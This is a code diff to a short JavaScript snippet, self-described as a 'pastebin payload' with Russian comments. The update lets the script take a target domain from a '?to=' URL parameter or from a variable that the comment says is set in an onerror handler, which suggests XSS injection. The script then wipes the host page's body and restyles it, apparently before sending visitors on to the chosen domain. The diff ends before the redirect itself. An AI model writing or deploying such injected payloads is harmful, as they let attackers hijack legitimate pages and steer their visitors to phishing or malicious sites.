@@ -1,7 +1,17 @@
-// pastebin payload
+// Обновленный payload с поддержкой URL параметров
 (function(){
-    var domain = window.d || 'google.com';
-    var redirectUrl = domain.startsWith('http') ? domain : 'https://' + domain;
+    // Получаем домен из разных источников по приоритету:
+    // 1. Из параметра 'to' в URL (?to=example.com)
+    // 2. Из window.d (если установлен в onerror)
+    // 3. Значение по умолчанию 'google.com'
+    
+    var urlParams = new URLSearchParams(window.location.search);
+    var domain = urlParams.get('to') || window.d || 'google.com';
+    
+    // Очищаем возможные слеши
+    domain = domain.replace(/^https?:\/\//, '').replace(/\/$/, '');
+    
+    var redirectUrl = 'https://' + domain;
     
     document.body.innerHTML = '';
     document.body.style.cssText = 'margin:0;padding:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f0;font-family:Arial;';
